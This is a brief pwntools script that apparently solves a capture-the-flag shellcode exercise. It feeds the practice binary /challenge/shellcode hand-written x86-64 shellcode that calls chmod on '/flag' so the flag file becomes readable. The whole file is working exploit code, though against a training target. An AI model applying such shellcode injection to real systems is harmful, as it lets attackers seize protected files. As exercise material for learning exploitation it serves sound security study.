from pwn import *

context.arch = 'amd64'
context.os = 'linux'

p = process("/challenge/shellcode")
asm_code = asm("""
               xor rax, rax
               add al, 90
               lea rdi, [rip+flag]
               mov si, 0755
               syscall
               flag:
               .string "/flag"
               """)

# print(len(asm_code))

p.recvuntil("shellcode: ")
p.sendline(asm_code)
p.interactive()
